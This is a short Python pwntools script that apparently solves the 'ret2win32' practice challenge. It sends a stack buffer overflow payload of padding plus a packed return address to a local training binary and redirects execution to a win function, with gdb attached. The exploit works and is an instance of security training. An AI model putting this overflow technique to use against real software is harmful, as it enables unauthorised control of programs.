#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

local = 1
if local:
	p = process('./ret2win32')
else:
	p = remote()

ret2win = 0x08048659

gdb.attach(p, 'b 0x8048657')

p.recvuntil("> ");
payload = 'A' * 0x2C + p32(ret2win)
p.sendline(payload);

p.interactive()
